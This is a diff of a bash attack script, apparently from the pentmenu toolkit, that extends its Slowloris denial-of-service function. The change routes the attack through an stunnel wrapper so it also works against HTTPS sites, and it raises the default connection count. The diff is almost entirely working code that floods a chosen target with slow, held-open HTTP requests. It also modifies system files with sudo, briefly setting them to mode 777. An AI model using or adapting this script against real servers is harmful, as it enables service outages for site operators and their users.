@@ -78,8 +78,7 @@ showip()
 
 ## create slowloris function
 slowloris()
-{ echo "Using netcat for Slowloris attack...."
-echo "Please note that this attack currently does not work against encrypted (HTTPS) sites" && sleep 1
+{ echo "Using netcat for Slowloris attack...." && sleep 1
 echo "Enter target:"
 	read -i $TARGET -e TARGET
 echo "Target is set to $TARGET"
@@ -88,24 +87,64 @@ echo "Enter target port (defaults to 80):"
 	: ${PORT:=80}
 	if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
 PORT=80 && echo "Invalid port, reverting to port 80"
-	fi
-	if [ "$PORT" -lt "1" ]; then
+	elif [ "$PORT" -lt "1" ]; then
 PORT=80 && echo "Invalid port number chosen! Reverting port 80"
 	elif [ "$PORT" -gt "65535" ]; then
 PORT=80 && echo "Invalid port chosen! Reverting to port 80"
 	else echo "Using Port $PORT"
 	fi
-echo "Enter number of connections to open (default 200):"
+
+echo "Enter number of connections to open (default 500):"
 		read CONNS
-	: ${CONNS:=200}
+	: ${CONNS:=500}
 	if ! [[ "$CONNS" =~ ^[0-9]+$ ]]; then
-CONNS=200 && echo "Invalid integer!  Using 200 connections"
-	fi 
+CONNS=200 && echo "Invalid integer!  Using 500 connections"
+	fi
+
+echo "use SSL? [y]es or [n]o (default):"
+	read SSL
+	: ${SSL:=n}
+if [[ $SSL = y ]]
+	then echo "Using SSL/TLS"
+LHOST=127.0.0.1
+LPORT=9991
+grep -q 9991 /etc/services
+if [[ $? = 1 ]]
+then
+echo "Adding pentmenu slowloris service to /etc/services" && sudo chmod 777 /etc/services && sudo echo "pentmenu-slowloris-ssl 9991/tcp #pentmenu slowloris ssl listener" >> /etc/services &&  sudo chmod 644 /etc/services
+fi
+if test -f "/bin/ss"; then 
+	LISTPORT=ss; 
+	else LISTPORT=netstat
+fi
+$LISTPORT -tln |grep -q $LPORT
+if [[ $? = 1 ]]
+then
+	echo "Creating stunnel on $LHOST:$LPORT"	
+		sudo rm -f /etc/stunnel/pentmenu.conf;
+		sudo touch /etc/stunnel/pentmenu.conf && sudo chmod 777 /etc/stunnel/pentmenu.conf
+		sudo echo "[SLOWLORIS]" >> /etc/stunnel/pentmenu.conf
+		sudo echo "client=yes" >> /etc/stunnel/pentmenu.conf
+		sudo echo "accept=$LHOST:$LPORT" >> /etc/stunnel/pentmenu.conf
+		sudo echo "connect=$TARGET:$PORT" >> /etc/stunnel/pentmenu.conf
+		sudo echo "verify=0" >> /etc/stunnel/pentmenu.conf
+		sudo chmod 644 /etc/stunnel/pentmenu.conf
+		sudo stunnel /etc/stunnel/pentmenu.conf && sleep 1
+else echo "Looks like stunnel is already listening on port 9991, so not recreating"
+fi
 echo "Launching Slowloris....Use 'Ctrl c' to exit prematurely" && sleep 1
 	i=1
 	while [ "$i" -le "$CONNS" ]; do
-echo "Slowloris attack ongoing...this is connection $i"; echo -e "GET / HTTP/1.1\r\nHost: $TARGET\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\n$RANDOM: $RANDOM\r\n"|nc -i 59 -w 3000 $TARGET $PORT  2>/dev/null 1>/dev/null & i=$((i + 1)); done
+echo "Slowloris attack ongoing...this is connection $i"; echo -e "GET / HTTP/1.1\r\nHost: $TARGET\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\n$RANDOM: $RANDOM\r\n"|nc -i 59 -w 30000 $LHOST $LPORT  2>/dev/null 1>/dev/null & i=$((i + 1)); done
 echo "Opened $CONNS connections....returning to menu"
+
+else 
+echo "Launching Slowloris....Use 'Ctrl c' to exit prematurely" && sleep 1
+	i=1
+	while [ "$i" -le "$CONNS" ]; do
+echo "Slowloris attack ongoing...this is connection $i"; echo -e "GET / HTTP/1.1\r\nHost: $TARGET\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\n$RANDOM: $RANDOM\r\n"|nc -i 59 -w 30000 $TARGET $PORT  2>/dev/null 1>/dev/null & i=$((i + 1)); done
+echo "Opened $CONNS connections....returning to menu"
+fi
 }
 
 ## create UDP Flood function
